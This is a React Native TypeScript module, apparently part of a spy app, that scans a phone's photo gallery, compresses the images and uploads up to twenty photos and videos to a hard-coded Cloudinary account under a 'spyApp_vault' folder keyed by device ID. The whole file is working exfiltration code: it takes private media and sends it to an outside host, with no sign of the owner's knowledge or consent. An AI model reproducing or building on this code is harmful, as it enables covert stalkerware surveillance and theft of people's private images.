import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';

const CLOUD_NAME = 'dgbjpy7ev'; 
const UPLOAD_PRESET = 'spyapp_preset'; 

const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

export const scanAndUploadGallery = async (deviceId: string): Promise<string[]> => {
  try {
    const photos = await CameraRoll.getPhotos({
      first: 20,
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
    });

    const uploadedUrls: string[] = [];
    // Har device ke liye Cloudinary mein uska apna unique folder ban jayega
    const targetFolder = `spyApp_vault/${deviceId}`;

    for (const edge of photos.edges) {
      const node = edge.node as any;
      const isVideo = node.type && node.type.startsWith('video');

      if (isVideo) {
        const duration = node.playableDuration || node.duration || 0;
        if (duration > 120) {
          continue;
        }
      }

      let fileUri = node.image.uri;

      if (!isVideo) {
        try {
          const resized = await ImageResizer.createResizedImage(
            fileUri,
            1280,
            1280,
            'JPEG',
            80,
            0,
            undefined
          );
          fileUri = resized.uri;
        } catch (err) {
          console.error('Image compression failed:', err);
        }
      }

      const formData = new FormData();
      formData.append('file', {
        uri: fileUri,
        type: isVideo ? 'video/mp4' : 'image/jpeg',
        name: `upload_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`,
      } as any);
      formData.append('upload_preset', UPLOAD_PRESET);
      // Dynamic folder name assign karna
      formData.append('folder', targetFolder);

      const res = await axios.post(CLOUDINARY_URL, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });

      if (res.data.secure_url) {
        uploadedUrls.push(res.data.secure_url);
      }
    }

    return uploadedUrls;
  } catch (error) {
    console.error('Media pipeline error:', error);
    return [];
  }
};